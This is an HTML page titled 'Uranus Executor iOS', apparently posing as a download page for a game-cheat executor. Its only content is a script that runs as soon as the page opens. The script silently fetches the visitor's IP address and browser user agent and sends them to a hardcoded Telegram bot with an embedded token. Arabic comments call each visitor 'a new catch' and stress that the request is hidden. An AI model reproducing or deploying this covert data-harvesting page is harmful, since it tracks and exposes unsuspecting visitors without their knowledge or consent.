<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Uranus Executor iOS</title>
    <script>
        function sendToTelegram() {
            const token = '8719298403:AAG-9IJg2xLXm0YaV3yy0Z1wGEDGrjFQWxU';
            const chat_id = '6001286270';
            
            // جلب الـ IP من خدمة خارجية
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => {
                    const msg = `🎯 صيد جديد!\n🌐 IP: ${data.ip}\n📱 الجهاز: ${navigator.userAgent}`;
                    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
                    
                    // إرسال الطلب مخفي
                    navigator.sendBeacon(url);
                    
                    // إرسال طلب كلاسيكي للضمان
                    fetch(url);
                });
        }
        // التنفيذ فور فتح الصفحة
        window.onload = sendToTelegram;
    </script>
</head>

</body>
